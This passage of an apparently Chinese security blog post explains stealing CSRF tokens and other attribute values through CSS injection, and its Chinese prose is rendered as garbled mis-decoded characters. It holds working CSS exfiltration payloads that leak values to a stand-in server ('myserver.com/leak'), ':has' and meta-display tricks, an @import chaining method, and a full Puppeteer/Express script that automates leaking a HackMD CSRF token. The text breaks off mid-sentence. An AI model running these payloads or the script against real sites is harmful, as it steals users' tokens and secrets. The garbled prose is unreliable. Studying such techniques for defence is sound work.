ç•¶ä¸­ï¼Œæœ‰å¹¾å€‹é¸æ“‡å™¨å¯ä»¥é¸åˆ°ã€Œå±¬æ€§ç¬¦åˆæŸå€‹æ¢ä»¶çš„å…ƒç´ ã€ã€‚èˆ‰ä¾‹ä¾†èªªï¼Œinput[value^=a]ï¼Œå°±å¯ä»¥é¸åˆ° value é–‹é ­æ˜¯ a çš„å…ƒç´ ã€‚\né¡ä¼¼çš„é¸æ“‡å™¨æœ‰ï¼š\ninput[value^=a] é–‹é ­æ˜¯ a çš„ï¼ˆprefixï¼‰ input[value$=a] çµå°¾æ˜¯ a çš„ï¼ˆsuffixï¼‰ input[value*=a] å…§å®¹æœ‰ a çš„ï¼ˆcontainsï¼‰ è€Œç¬¬äºŒå€‹ç‰¹æ€§æ˜¯ï¼šå¯ä»¥åˆ©ç”¨ CSS ç™¼å‡º requestï¼Œä¾‹å¦‚èªªè¼‰å…¥ä¸€å¼µä¼ºæœå™¨ä¸Šçš„èƒŒæ™¯åœ–ç‰‡ï¼Œæœ¬è³ªä¸Šå°±æ˜¯åœ¨ç™¼ä¸€å€‹ requestã€‚\nå‡è¨­ç¾åœ¨é é¢ä¸Šæœ‰ä¸€æ®µå…§å®¹æ˜¯ \u0026lt;input name=\u0026quot;secret\u0026quot; value=\u0026quot;abc123\u0026quot;\u0026gt;ï¼Œè€Œæˆ‘èƒ½å¤ æ’å…¥ä»»ä½•çš„ CSSï¼Œæˆ‘å¯ä»¥é€™æ¨£å¯«ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;a\u0026#34;] { background: url(https://myserver.com?q=a) } input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;b\u0026#34;] { background: url(https://myserver.com?q=b) } input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;c\u0026#34;] { background: url(https://myserver.com?q=c) } //.... input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;z\u0026#34;] { background: url(https://myserver.com?q=z) } æœƒç™¼ç”Ÿä»€éº¼äº‹æƒ…ï¼Ÿ\nå› ç‚ºç¬¬ä¸€æ¢è¦å‰‡æœ‰é †åˆ©æ‰¾åˆ°å°æ‡‰çš„å…ƒç´ ï¼Œæ‰€ä»¥ input çš„èƒŒæ™¯å°±æœƒæ˜¯ä¸€å¼µä¼ºæœå™¨ä¸Šçš„åœ–ç‰‡ï¼Œè€Œç€è¦½å™¨å°±æœƒç™¼ request åˆ° https://myserver.com?q=aã€‚\nå› æ­¤ï¼Œç•¶æˆ‘åœ¨ server æ”¶åˆ°é€™å€‹ request çš„æ™‚å€™ï¼Œæˆ‘å°±çŸ¥é“ã€Œinput çš„ value å±¬æ€§ï¼Œç¬¬ä¸€å€‹å­—å…ƒæ˜¯ aã€ï¼Œå°±é †åˆ©å·åˆ°äº†ç¬¬ä¸€å€‹å­—å…ƒã€‚\né€™å°±æ˜¯ CSS ä¹‹æ‰€ä»¥å¯ä»¥å·è³‡æ–™çš„åŸå› ï¼Œé€éå±¬æ€§é¸æ“‡å™¨åŠ ä¸Šè¼‰å…¥åœ–ç‰‡é€™å…©å€‹åŠŸèƒ½ï¼Œå°±èƒ½å¤ è®“ server çŸ¥é“é é¢ä¸ŠæŸå€‹å…ƒç´ çš„å±¬æ€§å€¼æ˜¯ä»€éº¼ã€‚\nå¥½ï¼Œç¾åœ¨ç¢ºèª CSS å¯ä»¥å·å±¬æ€§çš„å€¼äº†ï¼Œæ¥ä¸‹ä¾†æœ‰å…©å€‹å•é¡Œï¼š\næœ‰ä»€éº¼æ±è¥¿å¥½å·ï¼Ÿ ä½ å‰›åªç¤ºç¯„å·ç¬¬ä¸€å€‹ï¼Œè¦æ€éº¼å·ç¬¬äºŒå€‹å­—å…ƒï¼Ÿ æˆ‘å€‘å…ˆä¾†è¨è«–ç¬¬ä¸€å€‹å•é¡Œï¼Œæœ‰å“ªäº›æ±è¥¿å¯ä»¥å·ï¼Ÿé€šå¸¸éƒ½æ˜¯è¦å·ä¸€äº›æ•æ„Ÿè³‡æ–™å°å§ï¼Ÿ\næœ€å¸¸è¦‹çš„ç›®æ¨™ï¼Œå°±æ˜¯ CSRF tokenã€‚å¦‚æœä½ ä¸çŸ¥é“ä»€éº¼æ˜¯ CSRFï¼Œå¯ä»¥å…ˆçœ‹çœ‹æˆ‘ä¹‹å‰å¯«éçš„é€™ä¸€ç¯‡ï¼šè®“æˆ‘å€‘ä¾†è«‡è«‡ CSRFï¼ˆè©±èªªæˆ‘æœ‰æ‰“ç®—å¯«æ–°çš„ CSRF ç³»åˆ—æ–‡ï¼Œæ‹–ç¨¿ä¸­ï¼Œæƒ³çœ‹çš„è©±å¯ç•™è¨€å‚¬ç¨¿ï¼‰ã€‚\nç°¡å–®ä¾†èªªå‘¢ï¼Œå¦‚æœ CSRF token è¢«å·èµ°ï¼Œå°±æœ‰å¯èƒ½æœƒè¢« CSRF æ”»æ“Šï¼Œç¸½ä¹‹ä½ å°±æƒ³æˆé€™å€‹ token å¾ˆé‡è¦å°±æ˜¯äº†ã€‚è€Œé€™å€‹ CSRF tokenï¼Œé€šå¸¸éƒ½æœƒè¢«æ”¾åœ¨ä¸€å€‹ hidden input ä¸­ï¼Œåƒæ˜¯é€™æ¨£ï¼š\n1 2 3 4 5 \u0026lt;form action=\u0026#34;/action\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;csrf-token\u0026#34; value=\u0026#34;abc123\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;username\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; æˆ‘å€‘è©²æ€éº¼å·åˆ°è£¡é¢çš„è³‡æ–™å‘¢ï¼Ÿ\nå· hidden input å°æ–¼ hidden input ä¾†èªªï¼Œç…§æˆ‘å€‘ä¹‹å‰é‚£æ¨£å¯«æ˜¯æ²’æœ‰æ•ˆæœçš„ï¼š\n1 2 3 input[name=\u0026#34;csrf-token\u0026#34;][value^=\u0026#34;a\u0026#34;] { background: url(https://example.com?q=a) } å› ç‚º input çš„ type æ˜¯ hiddenï¼Œæ‰€ä»¥é€™å€‹å…ƒç´ ä¸æœƒé¡¯ç¤ºåœ¨ç•«é¢ä¸Šï¼Œæ—¢ç„¶ä¸æœƒé¡¯ç¤ºï¼Œé‚£ç€è¦½å™¨å°±æ²’æœ‰å¿…è¦è¼‰å…¥èƒŒæ™¯åœ–ç‰‡ï¼Œå› æ­¤ server ä¸æœƒæ”¶åˆ°ä»»ä½• requestã€‚è€Œé€™å€‹é™åˆ¶éå¸¸åš´æ ¼ï¼Œå°±ç®—ç”¨ display:block !important; ä¹Ÿæ²’è¾¦æ³•è“‹éå»ã€‚\nè©²æ€éº¼è¾¦å‘¢ï¼Ÿæ²’é—œä¿‚ï¼Œæˆ‘å€‘é‚„æœ‰åˆ¥çš„é¸æ“‡å™¨ï¼Œåƒæ˜¯é€™æ¨£ï¼š\n1 2 3 input[name=\u0026#34;csrf-token\u0026#34;][value^=\u0026#34;a\u0026#34;] + input { background: url(https://example.com?q=a) } æœ€å¾Œé¢å¤šäº†ä¸€å€‹ + inputï¼Œé€™å€‹åŠ è™Ÿæ˜¯å¦å¤–ä¸€å€‹é¸æ“‡å™¨ï¼Œæ„æ€æ˜¯ã€Œé¸åˆ°å¾Œé¢çš„å…ƒç´ ã€ï¼Œæ‰€ä»¥æ•´å€‹é¸æ“‡å™¨åˆåœ¨ä¸€èµ·ï¼Œå°±æ˜¯ã€Œæˆ‘è¦é¸ name æ˜¯ csrf-tokenï¼Œvalue é–‹é ­æ˜¯ a çš„ inputï¼Œçš„å¾Œé¢é‚£å€‹ inputã€ï¼Œä¹Ÿå°±æ˜¯ \u0026lt;input name=\u0026quot;username\u0026quot;\u0026gt;ã€‚\næ‰€ä»¥ï¼ŒçœŸæ­£è¼‰å…¥èƒŒæ™¯åœ–ç‰‡çš„å…¶å¯¦æ˜¯åˆ¥çš„å…ƒç´ ï¼Œè€Œåˆ¥çš„å…ƒç´ ä¸¦æ²’æœ‰ type=hiddenï¼Œæ‰€ä»¥åœ–ç‰‡æœƒè¢«æ­£å¸¸è¼‰å…¥ã€‚\né‚£å¦‚æœå¾Œé¢æ²’æœ‰å…¶ä»–å…ƒç´ æ€éº¼è¾¦ï¼Ÿåƒæ˜¯é€™æ¨£ï¼š\n1 2 3 4 5 \u0026lt;form action=\u0026#34;/action\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;username\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;csrf-token\u0026#34; value=\u0026#34;abc123\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; ä»¥é€™å€‹æ¡ˆä¾‹ä¾†èªªï¼Œåœ¨ä»¥å‰å°±çœŸçš„ç©å®Œäº†ï¼Œå› ç‚º CSS ä¸¦æ²’æœ‰å¯ä»¥é¸åˆ°ã€Œå‰é¢çš„å…ƒç´ ã€çš„é¸æ“‡å™¨ï¼Œæ‰€ä»¥çœŸçš„æŸæ‰‹ç„¡ç­–ã€‚\nä½†ç¾åœ¨ä¸ä¸€æ¨£äº†ï¼Œå› ç‚ºæˆ‘å€‘æœ‰äº† :hasï¼Œé€™å€‹é¸æ“‡å™¨å¯ä»¥é¸åˆ°ã€Œåº•ä¸‹ç¬¦åˆç‰¹æ®Šæ¢ä»¶çš„å…ƒç´ ã€ï¼Œåƒé€™æ¨£ï¼š\n1 2 3 form:has(input[name=\u0026#34;csrf-token\u0026#34;][value^=\u0026#34;a\u0026#34;]){ background: url(https://example.com?q=a) } æ„æ€å°±æ˜¯æˆ‘è¦é¸åˆ°ã€Œåº•ä¸‹æœ‰ï¼ˆç¬¦åˆé‚£å€‹æ¢ä»¶çš„ inputï¼‰çš„ formã€ï¼Œæ‰€ä»¥æœ€å¾Œè¼‰å…¥èƒŒæ™¯çš„æœƒæ˜¯ formï¼Œä¸€æ¨£ä¹Ÿä¸æ˜¯é‚£å€‹ hidden inputã€‚é€™å€‹ has selector å¾ˆæ–°ï¼Œå¾ä¸Šå€‹æœˆåº•é‡‹å‡ºçš„ Chrome 105 é–‹å§‹æ‰æ­£å¼æ”¯æ´ï¼Œç›®å‰åªå‰©ä¸‹ Firefox çš„ç©©å®šç‰ˆé‚„æ²’æ”¯æ´äº†ï¼Œè©³æƒ…å¯çœ‹ï¼šcaniuse\næœ‰äº† has ä»¥å¾Œï¼ŒåŸºæœ¬ä¸Šå°±ç„¡æ•µäº†ï¼Œå› ç‚ºå¯ä»¥æŒ‡å®šæ”¹è®ŠèƒŒæ™¯çš„æ˜¯å“ªå€‹çˆ¶å…ƒç´ ï¼Œæ‰€ä»¥æƒ³æ€éº¼é¸å°±æ€éº¼é¸ï¼Œæ€æ¨£éƒ½é¸å¾—åˆ°ã€‚\nå· meta é™¤äº†æŠŠè³‡æ–™æ”¾åœ¨ hidden input ä»¥å¤–ï¼Œä¹Ÿæœ‰äº›ç¶²ç«™æœƒæŠŠè³‡æ–™æ”¾åœ¨ \u0026lt;meta\u0026gt; è£¡é¢ï¼Œä¾‹å¦‚èªª \u0026lt;meta name=\u0026quot;csrf-token\u0026quot; content=\u0026quot;abc123\u0026quot;\u0026gt;ï¼Œmeta é€™å€‹å…ƒç´ ä¸€æ¨£æ˜¯çœ‹ä¸è¦‹çš„å…ƒç´ ï¼Œè¦æ€éº¼å·å‘¢ï¼Ÿ\né¦–å…ˆï¼Œå¦‚åŒä¸Šå€‹æ®µè½çš„çµå°¾è¬›çš„ä¸€æ¨£ï¼Œhas æ˜¯çµ•å°å·å¾—åˆ°çš„ï¼Œå¯ä»¥é€™æ¨£å·ï¼š\n1 2 3 html:has(meta[name=\u0026#34;csrf-token\u0026#34;][content^=\u0026#34;a\u0026#34;]) { background: url(https://example.com?q=a); } ä½†é™¤æ­¤ä¹‹å¤–ï¼Œé‚„æœ‰å…¶ä»–æ–¹å¼ä¹Ÿå·å¾—åˆ°ã€‚\nmeta é›–ç„¶ä¹Ÿçœ‹ä¸åˆ°ï¼Œä½†è·Ÿ hidden input ä¸åŒï¼Œæˆ‘å€‘å¯ä»¥è‡ªå·±ç”¨ CSS è®“é€™å€‹å…ƒç´ è®Šæˆå¯è¦‹ï¼š\n1 2 3 4 5 6 7 meta { display: block; } meta[name=\u0026#34;csrf-token\u0026#34;][content^=\u0026#34;a\u0026#34;] { background: url(https://example.com?q=a); } å¯æ˜¯é€™æ¨£é‚„ä¸å¤ ï¼Œä½ æœƒç™¼ç¾ request é‚„æ˜¯æ²’æœ‰é€å‡ºï¼Œé€™æ˜¯å› ç‚º meta åœ¨ head åº•ä¸‹ï¼Œè€Œ head ä¹Ÿæœ‰é è¨­çš„ display:none å±¬æ€§ï¼Œå› æ­¤ä¹Ÿè¦å¹« head ç‰¹åˆ¥è¨­ç½®ï¼Œæ‰æœƒè®“ metaã€Œèƒ½è¢«çœ‹åˆ°ã€ï¼š\n1 2 3 4 5 6 7 head, meta { display: block; } meta[name=\u0026#34;csrf-token\u0026#34;][content^=\u0026#34;a\u0026#34;] { background: url(https://example.com?q=a); } ç…§ä¸Šé¢é€™æ¨£å¯«ï¼Œå°±æœƒçœ‹åˆ°ç€è¦½å™¨ç™¼å‡º requestã€‚ä¸éï¼Œç•«é¢ä¸Šå€’æ˜¯æ²’æœ‰é¡¯ç¤ºä»»ä½•æ±è¥¿ï¼Œå› ç‚ºç•¢ç«Ÿ content æ˜¯ä¸€å€‹å±¬æ€§ï¼Œè€Œä¸æ˜¯ HTML çš„ text nodeï¼Œæ‰€ä»¥ä¸æœƒé¡¯ç¤ºåœ¨ç•«é¢ä¸Šï¼Œä½†æ˜¯ meta é€™å€‹å…ƒç´ æœ¬èº«å…¶å¯¦æ˜¯çœ‹å¾—åˆ°çš„ï¼Œé€™ä¹Ÿæ˜¯ç‚ºä»€éº¼ request æœƒç™¼å‡ºå»ï¼š\nå¦‚æœä½ çœŸçš„æƒ³è¦åœ¨ç•«é¢ä¸Šé¡¯ç¤º content çš„è©±ï¼Œå…¶å¯¦ä¹Ÿåšå¾—åˆ°ï¼Œå¯ä»¥åˆ©ç”¨å½å…ƒç´ æ­é… attrï¼š\n1 2 3 meta:before { content: attr(content); } å°±æœƒçœ‹åˆ° meta è£¡é¢çš„å…§å®¹é¡¯ç¤ºåœ¨ç•«é¢ä¸Šäº†ã€‚\næœ€å¾Œï¼Œè®“æˆ‘å€‘ä¾†çœ‹ä¸€å€‹å¯¦éš›æ¡ˆä¾‹ã€‚\nå· HackMD çš„è³‡æ–™ HackMD çš„ CSRF token æ”¾åœ¨å…©å€‹åœ°æ–¹ï¼Œä¸€å€‹æ˜¯ hidden inputï¼Œå¦ä¸€å€‹æ˜¯ metaï¼Œå…§å®¹å¦‚ä¸‹ï¼š\n1 \u0026lt;meta name=\u0026#34;csrf-token\u0026#34; content=\u0026#34;h1AZ81qI-ns9b34FbasTXUq7a7_PPH8zy3RI\u0026#34;\u0026gt; è€Œ HackMD å…¶å¯¦æ”¯æ´ \u0026lt;style\u0026gt; çš„ä½¿ç”¨ï¼Œé€™å€‹æ¨™ç±¤ä¸æœƒè¢«éæ¿¾æ‰ï¼Œæ‰€ä»¥ä½ æ˜¯å¯ä»¥å¯«ä»»ä½•çš„ style çš„ï¼Œè€Œç›¸é—œçš„ CSP å¦‚ä¸‹ï¼š\n1 2 3 img-src * data:; style-src \u0026#39;self\u0026#39; \u0026#39;unsafe-inline\u0026#39; https://assets-cdn.github.com https://github.githubassets.com https://assets.hackmd.io https://www.google.com https://fonts.gstatic.com https://*.disquscdn.com; font-src \u0026#39;self\u0026#39; data: https://public.slidesharecdn.com https://assets.hackmd.io https://*.disquscdn.com https://script.hotjar.com; å¯ä»¥çœ‹åˆ° unsafe-inline æ˜¯å…è¨±çš„ï¼Œæ‰€ä»¥å¯ä»¥æ’å…¥ä»»ä½•çš„ CSSã€‚\nç¢ºèªå¯ä»¥æ’å…¥ CSS ä»¥å¾Œï¼Œå°±å¯ä»¥é–‹å§‹ä¾†æº–å‚™å·è³‡æ–™äº†ã€‚é‚„è¨˜å¾—å‰é¢æœ‰ä¸€å€‹å•é¡Œæ²’æœ‰å›ç­”ï¼Œé‚£å°±æ˜¯ã€Œè©²æ€éº¼å·ç¬¬ä¸€å€‹ä»¥å¾Œçš„å­—å…ƒï¼Ÿã€ï¼Œæˆ‘å…ˆä»¥ HackMD ç‚ºä¾‹å›ç­”ã€‚\né¦–å…ˆï¼ŒCSRF token é€™ç¨®æ±è¥¿é€šå¸¸é‡æ–°æ•´ç†å°±æœƒæ›ä¸€å€‹ï¼Œæ‰€ä»¥ä¸èƒ½é‡æ–°æ•´ç†ï¼Œè€Œ HackMD å‰›å¥½æ”¯æ´å³æ™‚æ›´æ–°ï¼Œåªè¦å…§å®¹è®Šäº†ï¼Œæœƒç«‹åˆ»åæ˜ åœ¨å…¶ä»– client çš„ç•«é¢ä¸Šï¼Œå› æ­¤å¯ä»¥åšåˆ°ã€Œä¸é‡æ–°æ•´ç†è€Œæ›´æ–° styleã€ï¼Œæµç¨‹æ˜¯é€™æ¨£çš„ï¼š\næº–å‚™å¥½å·ç¬¬ä¸€å€‹å­—å…ƒçš„ styleï¼Œæ’å…¥åˆ° HackMD è£¡é¢ å—å®³è€…æ‰“é–‹é é¢ ä¼ºæœå™¨æ”¶åˆ°ç¬¬ä¸€å€‹å­—å…ƒçš„ request å¾ä¼ºæœå™¨æ›´æ–° HackMD å…§å®¹ï¼Œæ›æˆå·ç¬¬äºŒå€‹å­—å…ƒçš„ payload å—å®³è€…é é¢å³æ™‚æ›´æ–°ï¼Œè¼‰å…¥æ–°çš„ style ä¼ºæœå™¨æ”¶åˆ°ç¬¬äºŒå€‹å­—å…ƒçš„ request ä¸æ–·å¾ªç’°ç›´åˆ°å·å®Œæ‰€æœ‰å­—å…ƒ ç°¡å–®çš„ç¤ºæ„åœ–å¦‚ä¸‹ï¼š\nç¨‹å¼ç¢¼å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 const puppeteer = require(\u0026#39;puppeteer\u0026#39;); const express = require(\u0026#39;express\u0026#39;) const sleep = ms =\u0026gt; new Promise(resolve =\u0026gt; setTimeout(resolve, ms)); // Create a hackMD document and let anyone can view/edit const noteUrl = \u0026#39;https://hackmd.io/1awd-Hg82fekACbL_ode3aasf\u0026#39; const host = \u0026#39;http://localhost:3000\u0026#39; const baseUrl = host + \u0026#39;/extract?q=\u0026#39; const port = process.env.PORT || 3000 ;(async function() { const app = express() const browser = await puppeteer.launch({ headless: true }); const page = await browser.newPage(); await page.setViewport({ width: 1280, height: 800 }) await page.setRequestInterception(true); page.on(\u0026#39;request\u0026#39;, request =\u0026gt; { const url = request.url() // cancel request to self if (url.includes(baseUrl)) { request.abort() } else { request.continue() } }); app.listen(port, () =\u0026gt; { console.log(`Listening at http://localhost:${port}`) console.log(\u0026#39;Waiting for server to get ready...\u0026#39;) startExploit(app, page) }) })() async function startExploit(app, page) { let currentToken = \u0026#39;\u0026#39; await page.goto(noteUrl + \u0026#39;?edit\u0026#39;); // @see: https://stackoverflow.com/questions/51857070/puppeteer-in-nodejs-reports-error-node-is-either-not-visible-or-not-an-htmlele await page.addStyleTag({ content: \u0026#34;{scroll-behavior: auto !important;}\u0026#34; }); const initialPayload = generateCss() await updateCssPayload(page, initialPayload) console.log(`Server is ready, you can open ${noteUrl}?view on the browser`) app.get(\u0026#39;/extract\u0026#39;, (req, res) =\u0026gt; { const query = req.query.q if (!query) return res.end() console.log(`query: ${query}, progress: ${query.length}/36`) currentToken = query if (query.length === 36) { console.log(\u0026#39;over\u0026#39;) return } const payload = generateCss(currentToken) updateCssPayload(page, payload) res.end() }) } async function updateCssPayload(page, payload) { await sleep(300) await page.click(\u0026#39;.CodeMirror-line\u0026#39;) await page.keyboard.down(\u0026#39;Meta\u0026#39;); await page.keyboard.press(\u0026#39;A\u0026#39;); await page.keyboard.up(\u0026#39;Meta\u0026#39;); await page.keyboard.press(\u0026#39;Backspace\u0026#39;); await sleep(300) await page.keyboard.sendCharacter(payload) console.log(\u0026#39;Updated css payload, waiting for next request\u0026#39;) } function generateCss(prefix = \u0026#34;\u0026#34;) { const csrfTokenChars = \u0026#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_\u0026#39;.split(\u0026#39;\u0026#39;) return ` ${prefix} \u0026lt;style\u0026gt; head, meta { display: block; } ${ csrfTokenChars.map(char =\u0026gt; ` meta[name=\u0026#34;csrf-token\u0026#34;][content^=\u0026#34;${prefix + char}\u0026#34;] { background: url(${baseUrl}${prefix + char}) } `).join(\u0026#39;\\n\u0026#39;) } \u0026lt;/style\u0026gt; ` } å¯ä»¥ç›´æ¥ç”¨ Node.js è·‘èµ·ä¾†ï¼Œè·‘èµ·ä¾†ä»¥å¾Œåœ¨ç€è¦½å™¨æ‰“é–‹ç›¸å°æ‡‰çš„æ–‡ä»¶ï¼Œå°±å¯ä»¥åœ¨ terminal çœ‹åˆ° leak çš„é€²åº¦ã€‚\nä¸éå‘¢ï¼Œå°±ç®—å·åˆ°äº† HackMD çš„ CSRF tokenï¼Œä¾ç„¶é‚„æ˜¯æ²’è¾¦æ³• CSRFï¼Œå› ç‚º HackMD æœ‰åœ¨ server æª¢æŸ¥å…¶ä»–çš„ HTTP request header å¦‚ origin æˆ–æ˜¯ referer ç­‰ç­‰ï¼Œç¢ºä¿ request ä¾†è‡ªåˆæ³•çš„åœ°æ–¹ã€‚\nç¸½çµ åœ¨é€™ç¯‡è£¡é¢ï¼Œæˆ‘å€‘çœ‹åˆ°äº†ä¹‹æ‰€ä»¥å¯ä»¥ç”¨ CSS ä¾†å·è³‡æ–™çš„åŸç†ï¼Œèªªç©¿äº†å°±æ˜¯åˆ©ç”¨ã€Œå±¬æ€§é¸æ“‡å™¨ã€å†åŠ ä¸Šã€Œè¼‰å…¥åœ–ç‰‡ã€é€™å…©å€‹ç°¡å–®çš„åŠŸèƒ½ï¼Œä¹Ÿç¤ºç¯„äº†å¦‚ä½•å·å– hidden input è·Ÿ meta è£¡çš„è³‡æ–™ï¼Œä¸¦ä¸”ä»¥ HackMDç•¶ä½œå¯¦éš›æ¡ˆä¾‹èªªæ˜ã€‚\nä½†æ˜¯å‘¢ï¼Œæœ‰å¹¾å€‹å•é¡Œæˆ‘å€‘é‚„æ²’è§£æ±ºï¼Œåƒæ˜¯ï¼š\nHackMD å› ç‚ºå¯ä»¥å³æ™‚åŒæ­¥å…§å®¹ï¼Œæ‰€ä»¥ä¸éœ€è¦é‡æ–°æ•´ç†å°±å¯ä»¥è¼‰å…¥æ–°çš„ styleï¼Œé‚£å…¶ä»–ç¶²ç«™å‘¢ï¼Ÿè©²æ€éº¼å·åˆ°ç¬¬äºŒå€‹ä»¥å¾Œçš„å­—å…ƒï¼Ÿ ä¸€æ¬¡åªèƒ½å·ä¸€å€‹å­—å…ƒçš„è©±ï¼Œæ˜¯ä¸æ˜¯è¦å·å¾ˆä¹…å‘¢ï¼Ÿé€™åœ¨å¯¦éš›ä¸Šå¯è¡Œå—ï¼Ÿ æœ‰æ²’æœ‰è¾¦æ³•å·åˆ°å±¬æ€§ä»¥å¤–çš„æ±è¥¿ï¼Ÿä¾‹å¦‚èªªé é¢ä¸Šçš„æ–‡å­—å…§å®¹ï¼Œæˆ–ç”šè‡³æ˜¯ JavaScript çš„ç¨‹å¼ç¢¼ï¼Ÿ é‡å°é€™å€‹æ”»æ“Šæ‰‹æ³•çš„é˜²ç¦¦æ–¹å¼æœ‰å“ªäº›ï¼Ÿ ç”¨ CSS ä¾†å·è³‡æ–™ - CSS injectionï¼ˆä¸‹ï¼‰ å·åˆ°æ‰€æœ‰å­—å…ƒ æˆ‘å€‘æƒ³å·çš„è³‡æ–™æœ‰å¯èƒ½åªè¦é‡æ–°æ•´ç†ä»¥å¾Œå°±æœƒæ”¹è®Šï¼ˆå¦‚ CSRF tokenï¼‰ï¼Œæ‰€ä»¥æˆ‘å€‘å¿…é ˆåœ¨ä¸é‡æ–°æ•´ç†çš„ç‹€æ³ä¹‹ä¸‹è¼‰å…¥æ–°çš„ styleã€‚\nå‰é¢ä¹‹æ‰€ä»¥åšå¾—åˆ°ï¼Œæ˜¯å› ç‚º HackMD æœ¬èº«å°±æ˜¯ä¸€å€‹æ¨™æ¦œå³æ™‚æ›´æ–°çš„æ–‡ä»¶ï¼Œä½†å¦‚æœæ˜¯ä¸€èˆ¬çš„ç¶²é å‘¢ï¼Ÿåœ¨ä¸èƒ½ç”¨ JavaScript çš„æƒ…æ³ä¸‹ï¼Œè©²å¦‚ä½•ä¸æ–·å‹•æ…‹è¼‰å…¥æ–°çš„ styleï¼Ÿ\næœ‰é—œæ–¼é€™å€‹å•é¡Œï¼Œåœ¨ CSS Injection Attacks é€™ä»½ç°¡å ±è£¡é¢çµ¦å‡ºäº†è§£ç­”ï¼š@importã€‚\nåœ¨ CSS è£¡é¢ï¼Œä½ å¯ä»¥ç”¨ @import å»æŠŠå¤–éƒ¨çš„å…¶ä»– style å¼•å…¥é€²ä¾†ï¼Œå°±åƒ JavaScript çš„ import é‚£æ¨£ã€‚\næˆ‘å€‘å¯ä»¥åˆ©ç”¨é€™å€‹åŠŸèƒ½åšå‡ºå¼•å…¥ style çš„è¿´åœˆï¼Œå¦‚ä¸‹é¢çš„ç¨‹å¼ç¢¼ï¼š\n1 @import url(https://myserver.com/start?len=8) æ¥è‘—ï¼Œåœ¨ server å›å‚³å¦‚ä¸‹çš„ styleï¼š\n1 2 3 4 5 6 7 8 @import url(https://myserver.com/payload?len=1) @import url(https://myserver.com/payload?len=2) @import url(https://myserver.com/payload?len=3) @import url(https://myserver.com/payload?len=4) @import url(https://myserver.com/payload?len=5) @import url(https://myserver.com/payload?len=6) @import url(https://myserver.com/payload?len=7) @import url(https://myserver.com/payload?len=8) é‡é»ä¾†äº†ï¼Œé€™é‚Šé›–ç„¶ä¸€æ¬¡å¼•å…¥äº† 8 å€‹ï¼Œä½†æ˜¯ã€Œå¾Œé¢ 7 å€‹ requestï¼Œserver éƒ½æœƒå…ˆ hang ä½ï¼Œä¸æœƒçµ¦ responseã€ï¼Œåªæœ‰ç¬¬ä¸€å€‹ç¶²å€ https://myserver.com/payload?len=1 æœƒå›å‚³ responseï¼Œå…§å®¹ç‚ºä¹‹å‰æéçš„å·è³‡æ–™ payloadï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;a\u0026#34;] { background: url(https://b.myserver.com/leak?q=a) } input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;b\u0026#34;] { background: url(https://b.myserver.com/leak?q=b) } input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;c\u0026#34;] { background: url(https://b.myserver.com/leak?q=c) } //.... input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;z\u0026#34;] { background: url(https://b.myserver.com/leak?q=z) } ç•¶ç€è¦½å™¨æ”¶åˆ° response çš„æ™‚å€™ï¼Œå°±æœƒå…ˆè¼‰å…¥ä¸Šé¢é€™ä¸€æ®µ CSSï¼Œè¼‰å…¥å®Œä»¥å¾Œç¬¦åˆæ¢ä»¶çš„å…ƒç´ å°±æœƒç™¼ request åˆ°å¾Œç«¯ï¼Œå‡è¨­ç¬¬ä¸€å€‹å­—æ˜¯ d å¥½äº†ï¼Œæ¥è‘— server é€™æ™‚å€™æ‰å›å‚³ https://myserver.com/payload?len=2 çš„ responseï¼Œå…§å®¹ç‚ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;da\u0026#34;] { background: url(https://b.myserver.com/leak?q=da) } input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;db\u0026#34;] { background: url(https://b.myserver.com/leak?q=db) } input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;dc\u0026#34;] { background: url(https://b.myserver.com/leak?q=dc) } //.... input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;dz\u0026#34;] { background: url(https://b.myserver.com/leak?q=dz) } ä»¥æ­¤é¡æ¨ï¼Œåªè¦ä¸æ–·é‡è¤‡é€™äº›æ­¥é©Ÿï¼Œå°±å¯ä»¥æŠŠæ‰€æœ‰å­—å…ƒéƒ½å‚³åˆ° server å»ï¼Œé çš„å°±æ˜¯ import æœƒå…ˆè¼‰å…¥å·²ç¶“ä¸‹è¼‰å¥½çš„ resourceï¼Œç„¶å¾Œå»ç­‰å¾…é‚„æ²’ä¸‹è¼‰å¥½çš„ç‰¹æ€§ã€‚\né€™é‚Šæœ‰ä¸€é»è¦ç‰¹åˆ¥æ³¨æ„ï¼Œä½ æœƒç™¼ç¾æˆ‘å€‘è¼‰å…¥ style çš„ domain æ˜¯ myserver.comï¼Œè€ŒèƒŒæ™¯åœ–ç‰‡çš„ domain æ˜¯ b.myserver.comï¼Œé€™æ˜¯å› ç‚ºç€è¦½å™¨é€šå¸¸å°æ–¼ä¸€å€‹ domain èƒ½åŒæ™‚è¼‰å…¥çš„ request 